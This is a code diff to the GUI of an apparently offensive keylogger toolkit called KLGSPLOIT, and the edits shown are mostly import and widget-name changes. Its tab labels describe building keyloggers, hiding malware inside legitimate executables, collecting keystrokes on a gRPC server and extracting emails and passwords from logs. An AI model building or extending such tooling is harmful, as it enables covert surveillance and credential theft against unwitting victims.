@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+
 """
 KLGSPLOIT GUI - Keylogger Toolkit with ttkbootstrap
 Reuses CLI components and adds GUI + Executable Merging capability
@@ -32,12 +32,6 @@ from klgsploit_cli import (
 
 # Try to import ttkbootstrap for better styling
 try:
-    import ttkbootstrap as ttk
-    from ttkbootstrap.constants import *
-    from ttkbootstrap.scrolled import ScrolledText
-    from ttkbootstrap.dialogs import Messagebox
-    HAS_TTKBOOTSTRAP = True
-except ImportError:
     from tkinter import ttk
     from tkinter import messagebox as Messagebox
     ScrolledText = TkScrolledText
@@ -49,7 +43,8 @@ except ImportError:
     NW, NE, SW, SE = tk.NW, tk.NE, tk.SW, tk.SE
     EW, NS, NSEW = tk.EW, tk.NS, tk.NSEW
     HORIZONTAL, VERTICAL = tk.HORIZONTAL, tk.VERTICAL
-
+except ImportError:
+    pass 
 try:
     import PyInstaller.__main__ as pyinstaller
 except ImportError:
@@ -342,7 +337,7 @@ class KlgsploitGUI:
     # TAB 1: BUILD STANDARD
     # ============================================
     def setup_build_tab(self):
-        frame = ttk.LabelFrame(self.tab_build, text="Build Standard Executable", padding=20)
+        frame = ttk.Labelframe(self.tab_build, text="Build Standard Executable", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Platform selection
@@ -423,7 +418,7 @@ class KlgsploitGUI:
     # TAB 2: BUILD ADVANCED
     # ============================================
     def setup_build_advanced_tab(self):
-        frame = ttk.LabelFrame(self.tab_build_adv, text="Build Advanced Executable (gRPC + Screenshots)", padding=20)
+        frame = ttk.Labelframe(self.tab_build_adv, text="Build Advanced Executable (gRPC + Screenshots)", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Platform
@@ -523,7 +518,7 @@ class KlgsploitGUI:
     # TAB 3: MERGE EXECUTABLES (NEW FEATURE)
     # ============================================
     def setup_merge_tab(self):
-        frame = ttk.LabelFrame(self.tab_merge, text="Merge Executables (Hide Malware in Legitimate App)", padding=20)
+        frame = ttk.Labelframe(self.tab_merge, text="Merge Executables (Hide Malware in Legitimate App)", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Cover executable
@@ -636,7 +631,7 @@ The merged executable will:
     # TAB 4: KEYLOGGER
     # ============================================
     def setup_keylogger_tab(self):
-        frame = ttk.LabelFrame(self.tab_keylog, text="Local Keylogger", padding=20)
+        frame = ttk.Labelframe(self.tab_keylog, text="Local Keylogger", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         ttk.Label(frame, text=f"Current Platform: {self.platform.upper()}", font=("Helvetica", 12)).pack(pady=10)
@@ -693,7 +688,7 @@ The merged executable will:
     # TAB 5: gRPC SERVER
     # ============================================
     def setup_server_tab(self):
-        frame = ttk.LabelFrame(self.tab_server, text="gRPC Keylog Server", padding=20)
+        frame = ttk.Labelframe(self.tab_server, text="gRPC Keylog Server", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Host/Port config
@@ -749,7 +744,7 @@ The merged executable will:
     # TAB 6: CLASSIFY
     # ============================================
     def setup_classify_tab(self):
-        frame = ttk.LabelFrame(self.tab_classify, text="Classify Log File (Extract Emails/Passwords)", padding=20)
+        frame = ttk.Labelframe(self.tab_classify, text="Classify Log File (Extract Emails/Passwords)", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Input file
@@ -837,7 +832,7 @@ The merged executable will:
     # TAB 7: SCREENSHOT
     # ============================================
     def setup_screenshot_tab(self):
-        frame = ttk.LabelFrame(self.tab_screenshot, text="Take Screenshot", padding=20)
+        frame = ttk.Labelframe(self.tab_screenshot, text="Take Screenshot", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # Output directory
@@ -876,7 +871,7 @@ The merged executable will:
     # TAB 8: LOG VIEWER
     # ============================================
     def setup_log_viewer_tab(self):
-        frame = ttk.LabelFrame(self.tab_logs, text="Log File Viewer", padding=20)
+        frame = ttk.Labelframe(self.tab_logs, text="Log File Viewer", padding=20)
         frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
         
         # File selection
